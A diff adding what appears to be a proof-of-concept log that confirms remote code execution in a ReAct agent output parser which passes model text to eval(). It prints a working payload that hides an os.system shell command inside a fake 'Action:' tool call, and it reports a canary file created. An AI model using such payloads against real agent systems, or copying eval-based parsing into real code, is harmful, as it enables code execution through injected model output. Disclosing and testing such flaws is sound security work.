@@ -1,0 +1,11 @@
+sha256(react_converter.py): 5377ddbdc39397029cfbd4143dbe38d961fb47a034f6d38d9a9e7da21c7f8220
+confirmed: real source contains `action = eval(text_output)`
+
+Action payload:
+   Action:\n__import__('os').system('touch /work/YT_CANARY_REAL') or {'name':'search','arguments':{'q':'x'}} 
+
+canary before: False
+canary after : True
+parser returned: ['<ResponseOutputItem stub>']
+
+RESULT: RCE CONFIRMED — real ReactConverter._parse_react_output eval'd attacker code
